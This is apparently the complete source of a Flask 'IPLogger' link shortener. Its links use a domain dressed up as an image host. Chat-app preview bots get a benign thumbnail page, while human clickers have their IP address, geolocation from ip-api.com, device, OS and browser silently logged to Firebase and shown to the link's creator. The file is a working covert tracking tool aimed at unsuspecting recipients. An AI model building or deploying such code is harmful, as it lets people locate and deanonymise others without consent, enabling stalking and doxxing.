import hmac
import os
import random
import string
from functools import wraps
from urllib.parse import urlsplit

import firebase_admin
import requests
from firebase_admin import credentials, db
from flask import Flask, Response, abort, jsonify, redirect, render_template, request, url_for


if not firebase_admin._apps:
    firebase_admin.initialize_app(
        credentials.Certificate(os.environ["FIREBASE_SERVICE_ACCOUNT"]),
        {"databaseURL": os.environ["databaseURL"]}
    )

app = Flask(__name__)

BASE_URL = "https://images.pusat.cloud"

PREVIEW_BOTS = (
    "facebookexternalhit",
    "facebot",
    "twitterbot",
    "linkedinbot",
    "whatsapp",
    "telegrambot",
    "discordbot",
    "slackbot",
)


def require_dashboard_auth(view):
    @wraps(view)
    def wrapped(*args, **kwargs):
        auth = request.authorization
        expected_user = os.environ.get("DASHBOARD_USERNAME", "")
        expected_password = os.environ.get("DASHBOARD_PASSWORD", "")

        valid = (
            auth
            and expected_user
            and expected_password
            and hmac.compare_digest(auth.username, expected_user)
            and hmac.compare_digest(auth.password, expected_password)
        )

        if not valid:
            return Response(
                "Authentication required.",
                401,
                {"WWW-Authenticate": 'Basic realm="IPLogger Dashboard"'}
            )

        return view(*args, **kwargs)

    return wrapped


def normalize_url(value):
    if not value:
        abort(400, "URL is required.")

    if "://" not in value:
        value = f"https://{value}"

    parsed = urlsplit(value)
    if parsed.scheme not in ("http", "https") or not parsed.netloc:
        abort(400, "Only valid HTTP/HTTPS URLs are allowed.")

    return value


def is_preview_bot():
    user_agent = request.headers.get("User-Agent", "").lower()
    return any(bot in user_agent for bot in PREVIEW_BOTS)


@app.route("/", methods=["GET", "POST"])
def index1():
    if request.method == "GET":
        return render_template("index.html")

    url = request.form["url"]
    return redirect(url_for("shrtn", url=url))


@app.route("/<string:abbr>/")
def index(abbr):
    user = db.reference(abbr).get()
    if not user or "original_url" not in user:
        abort(404)

    final = normalize_url(user["original_url"])

    # Menampilkan metadata thumbnail untuk WhatsApp/Facebook/Telegram,
    # tanpa mencatat crawler sebagai kunjungan manusia.
    if is_preview_bot():
        return render_template(
            "preview.html",
            destination_host=urlsplit(final).netloc,
            image_url=f"{BASE_URL}/static/link-preview.png",
            short_url=f"{BASE_URL}/{abbr}/",
        )

    ip_address = request.remote_addr or ""
    user_agent = request.user_agent
    user_agent_text = user_agent.string or ""

    try:
        parts = user_agent_text.split("(", 1)[1].split(")", 1)[0].split(";")
        family = parts[0].strip() if len(parts) > 0 else ""
        os_name = parts[1].strip() if len(parts) > 1 else ""
        device = parts[2].strip() if len(parts) > 2 else ""
    except (IndexError, AttributeError):
        family = ""
        os_name = ""
        device = ""

    try:
        ip_info = requests.get(
            f"http://ip-api.com/json/{ip_address}",
            timeout=5
        ).json()
    except requests.RequestException:
        ip_info = {"status": "unavailable"}

    result = {
        "ip": ip_address,
        "ip_info": ip_info,
        "family": family,
        "device": device,
        "os": os_name,
        "platform": user_agent.platform,
        "browser": user_agent.browser,
        "version": user_agent.version,
        "user_agent": user_agent_text,
    }

    db.reference(abbr).update({"track": result})

    return redirect(final)


@app.route("/gen/")
@require_dashboard_auth
def shrtn():
    url = normalize_url(request.args.get("url"))

    letters_and_digits = string.ascii_letters + string.digits
    result_str = "".join(random.choice(letters_and_digits) for _ in range(8))

    shrt_url = f"{BASE_URL}/{result_str}/"
    track_url = f"{BASE_URL}/track/{result_str}"

    data = {
        "id": result_str,
        "original_url": url,
        "shortened_url": shrt_url,
        "track": "No one has accessed the link yet",
    }

    db.reference(result_str).set(data)

    return render_template(
        "generate.html",
        shrt_url=shrt_url,
        track_url=track_url
    )


@app.route("/track/<string:abbr>", methods=["GET"])
@require_dashboard_auth
def get_tasks(abbr):
    user = db.reference(abbr).get()
    if not user or "track" not in user:
        abort(404)

    return jsonify(user["track"])


application = app

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)